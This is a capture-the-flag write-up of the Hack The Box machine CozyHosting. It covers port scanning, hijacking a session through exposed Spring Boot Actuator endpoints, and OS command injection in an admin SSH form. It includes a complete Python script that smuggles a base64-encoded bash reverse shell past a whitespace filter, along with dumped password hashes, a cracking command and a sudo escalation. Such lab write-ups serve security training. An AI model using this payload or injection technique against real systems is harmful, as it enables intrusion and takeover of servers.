---
title: "CozyHosting HTB Writeup"
date: 2023-09-10 00:00:00 +0800
categories: [HTB Writeup]
tags: [Writeup]
---

Machine: CozyHosting
IP: 10.10.11.230
Difficult: Easy

![img-description](/assets/img/cozyhostinghtb.jpeg)
_CozyHosting_

CozyHosting is an easy htb machine which has an information leak, and then we access a container through an OS command injection, to escalate privileges, we abuse an ssh vulnerability using gtfobins

# Enumeration
# Port Scanning & Service Detection
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.230 -oG allports 

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-10 22:48 -04
Initiating SYN Stealth Scan at 22:48
Scanning 10.10.11.230 [65535 ports]
Discovered open port 80/tcp on 10.10.11.230
Discovered open port 22/tcp on 10.10.11.230
Nmap scan report for 10.10.11.230
Host is up, received user-set (7.9s latency).
Scanned at 2023-09-10 22:48:12 -04 for 39s
Not shown: 64465 filtered tcp ports (no-response), 1068 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.26 seconds
           Raw packets sent: 131002 (5.764MB) | Rcvd: 31758 (1.270MB)
```

The open ports for this machine are: 22 -> SSH & 80 -> HTTP

now let's look at the services

```bash
nmap -sCV -p22,80 10.10.11.230 -oN scan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-10 23:53 -04
Nmap scan report for 10.10.11.230
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

first of all let's add: cozyhosting.htb to /etc/hosts, It seems that this is the main page:
![img-description](/assets/img/cozyimages.png)
_Main Page_

# Web Enum
Now let's use brute force to discover directories, using dirsearch or any other tool focused on this

```bash
dirsearch -u http://cozyhosting.htb/

[10:13:00] 200 -  634B  - /actuator                                         
[10:13:00] 200 -   15B  - /actuator/health                                  
[10:13:00] 200 -   10KB - /actuator/mappings                                
[10:13:01] 200 -    5KB - /actuator/env                                     
[10:13:01] 200 -   95B  - /actuator/sessions                                
[10:13:03] 200 -  124KB - /actuator/beans   

```

actuator?... investigating, I found the following: Spring Boot Actuator is a sub-project of the Spring Boot Framework. It includes a number of additional features that help us to monitor and manage the Spring Boot application. It contains the actuator endpoints (the place where the resources live).

If we go to this route: http://cozyhosting.htb/actuator/sessions
We can see that there is a kanderson user, with a session cookie
Looking at our cookies, there is a **JSESSIONID**, we change it to that of the user kanderson and we go to: http://cozyhosting.htb/admin
and we access the administration panel


![img-description](/assets/img/admincozy.png)
_Dashboard_

Below we see some fields, so the service seems to connect to an ssh server, providing the host and user

![img-description](/assets/img/ssh.png)
_SSH Cozy service_


# Explotation
By listing these forms we realize many things:

1) does not allow whitespace
2) if we place a ";" in the user field or "|" It takes us to a 404 not found route, and with a message **command not found**, as if a command were being executed from a terminal

Therefore, the user field is vulnerable to: **OS Command Injection**, we know that we cannot use spaces, so below I created a python script to automate this process and thus obtain access to the server


```python
# IMPORTS #
import requests
import json
import sys
import subprocess

# Config Target
URL = "http://cozyhosting.htb"
headers = {'Content-Type':'application/vnd.spring-boot.actuator.v3+json'}

# lhost - lport
if len(sys.argv) != 3:
    print('[!] Usage: %s host port' % (sys.argv[0]))
    print('[*] Example: ./autopwn.py 10.10.12.14 443\n')

lhost = sys.argv[1]
lport = sys.argv[2]

# create payload

# 1) encode in base64
proc=subprocess.Popen([f"echo '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' | base64"],stdout=subprocess.PIPE,shell=True)
out, _ = proc.communicate()
result = out.decode().strip()

# 2) generate shell payload
payload=";$(echo${IFS}%s${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}/bin/bash${IFS})" % (result)


def getAdminDashboard():
    # url for get session
    session_url = URL + "/actuator/sessions"
    r = requests.get(session_url,headers=headers)
    data = r.json()

    # loop on each value
    desired_value = 'kanderson'
    key = None

    for k,v in data.items():
        if v == desired_value:
           key = k
           break
    return key


def getShell():
    session = getAdminDashboard()

    new_url = URL + "/executessh"

    # Cookie to access at dashboard
    cookies = {
            'JSESSIONID':session
    }

    # payload data
    data = {
            'host': '127.0.0.1',
            'username': payload
    }

    request = requests.post(new_url,cookies=cookies,data=data)

if __name__ == "__main__":
    print('[!] Befote execute this script start a listener with netcat')
    print('[*] Example: nc -nlvp 443')
    print('[*] Getting Shell ...')
    getShell()
```

so we listen on the port that you specify to the script and booom we get a reverse shell


![img-description](/assets/img/revshell.png)
_Getting Reverse Shell_

# Privilige Escalation -> (josh)
we decompress it using: unzip cloudhosting-0.0.1.jar
After unzipping the file, find the username and password to connect through postgress

psql -h victim_ip -U postgres -d cozyhosting

```sql
    \dt
    Displayed the columns of the users table:
    
    \d users
    This revealed the name and password columns. I queried those columns:

    SELECT name,password FROM users;

    we get:

    kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
    admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

**Cracking Usin john**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

and we get the password so we connect via ssh with the user josh

# Privilege Escalation -> (root)
```bash
sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Checking GTFOBins, I found I could escalate privileges with:

![img-description](/assets/img/root.png)
_Rooted_

Boom **rooted**!!!



